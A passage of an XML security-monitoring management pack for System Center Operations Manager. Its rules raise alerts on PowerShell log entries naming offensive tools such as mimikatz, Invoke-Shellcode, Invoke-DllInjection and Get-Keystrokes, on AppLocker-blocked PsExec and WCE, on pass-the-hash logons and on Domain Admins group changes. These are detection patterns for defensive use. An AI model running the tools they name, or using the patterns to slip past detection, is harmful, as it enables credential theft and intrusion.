          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.PowerShellLog.GetHTTPStatus.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.PowerShellLog.GetKeystroke" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Windows PowerShell</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Get-Keystrokes</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.PowerShellLog.GetKeystroke.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.InvokeDLLInjection" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery>EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Invoke-DllInjection</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.InvokeDLLInjection.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.PowerShellLog.InvokeMimikatzInUse" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Windows PowerShell</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery>EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value>800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>mimikatz</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.PowerShellLog.InvokeMimikatzInUse.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.PowerShellLog.InvokeNinjaCopy" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Windows PowerShell</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Invoke-NinjaCopy</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.PowerShellLog.InvokeNinjaCopy.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.PowerShellLog.InvokePortScan" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Windows PowerShell</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Invoke-Portscan</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.PowerShellLog.InvokePortScan.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.PowerShellLog.InvokeShellCodeInUse" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Windows PowerShell</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Invoke-Shellcode</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.PowerShellLog.InvokeShellCodeInUse.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.PowerShellLog.PowerShellStartHiddenProcess" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Windows PowerShell</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <And>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">EventDescription</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>Start-Process</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">EventDescription</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>-WindowStyle Hidden</Pattern>
                      </RegExExpression>
                    </Expression>
                  </And>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.PowerShellLog.PowerShellStartHiddenProcess.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.APPLocker.PSExec" Enabled="false" Target="Windows!Microsoft.Windows.Computer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Microsoft-Windows-AppLocker/EXE and DLL</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">8003</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>PSEXEC.EXE</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.APPLocker.PSExec.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.APPLocker.WCE" Enabled="false" Target="Windows!Microsoft.Windows.Computer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Microsoft-Windows-AppLocker/EXE and DLL</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">8003</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>WCE.EXE</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.APPLocker.WCE.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.APPLocker.Mimikatz" Enabled="false" Target="Windows!Microsoft.Windows.Computer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Microsoft-Windows-AppLocker/EXE and DLL</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">8003</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">mimikatz.exe</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.APPLocker.Mimikatz.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.APPLocker.ProhibitedApp" Enabled="true" Target="Windows!Microsoft.Windows.Computer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Microsoft-Windows-AppLocker/EXE and DLL</LogName>
            <Expression>
              <SimpleExpression>
                <ValueExpression>
                  <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                </ValueExpression>
                <Operator>Equal</Operator>
                <ValueExpression>
                  <Value Type="UnsignedInteger">8003</Value>
                </ValueExpression>
              </SimpleExpression>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.APPLocker.ProhibitedApp.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetbiosComputerName$</AlertParameter2>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.APPLocker.WinRar" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Microsoft-Windows-AppLocker/EXE and DLL</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">8003</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Winrar.exe</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.APPLocker.WinRar.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Pth.CredentialSwap" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4624</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">9</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[10]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">seclogo</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[11]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">Negotiate</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Pth.CredentialSwap.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Accounts.DomainAdminChange" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <Or>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">4729</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">4728</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                  </Or>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[3]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Domain Admins</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Accounts.DomainAdminChange.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Operational Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Accounts.SchemaAdminChange" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
